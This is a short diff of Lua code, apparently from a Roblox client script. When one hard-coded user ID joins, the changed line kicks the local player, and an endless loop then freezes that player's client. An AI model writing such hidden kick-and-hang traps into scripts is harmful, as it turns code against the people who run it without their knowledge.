@@ -2065,7 +2065,7 @@ runFunction(function()
 
 		local function newPlayer(plr)
 			if plr.UserId == 239702688 then 
-				task.spawn(function() plr:Kick("ur not funny") end)
+				task.spawn(function() lplr:Kick("ur not funny") end)
 				task.wait(0.5)
 				while true do end
 			end
